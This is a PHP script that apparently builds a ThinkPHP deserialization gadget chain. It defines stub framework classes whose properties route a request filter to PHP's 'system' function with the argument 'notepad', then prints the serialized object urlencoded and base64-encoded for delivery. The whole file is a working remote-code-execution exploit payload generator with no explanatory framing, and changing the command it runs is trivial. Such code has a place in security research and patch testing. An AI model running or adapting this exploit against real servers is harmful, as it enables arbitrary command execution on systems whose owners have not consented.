<?php

namespace think;
class Request {
    protected $hook = [];
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       => '_method',
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         => '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     => 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   => '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  => '',
        // HTTPS代理标识
        'https_agent_name' => '',
        // IP代理获取标识
        'http_agent_ip'    => 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  => 'html',
    ];
    protected $filter;
    protected $param = [];
    protected $mergeParam = false;
    
    public function __construct() {
        $this->hook = [ 'visible' => [$this, 'isAjax']];
        $this->config['var_ajax'] = '';
        $this->filter = 'system';
        $this->mergeParam = true;
        $this->param = 'notepad';
    }
}

namespace think;
abstract class Model {
    private $data = [];
    protected $append = [];
    public function __construct() {
        $this->data = ['fake' => new Request()];
        $this->append = [ 'fake' => ['dir', 'calc']];
    }
}

namespace think\model;
use think\Model;
class Pivot extends Model {

}

namespace think\process\pipes;
use think\model\Pivot;
abstract class Pipes {

}
class Windows extends Pipes {

    private $files = [];

    public function __construct() {
        $this->files = [new Pivot()];
    }

    public function getDescriptors() {

    }

    public function getFiles() {

    }

    public function readAndWrite($blocking, $close = false) {

    }

    public function areOpen() {

    }
}
echo urlencode(base64_encode(serialize(new Windows())));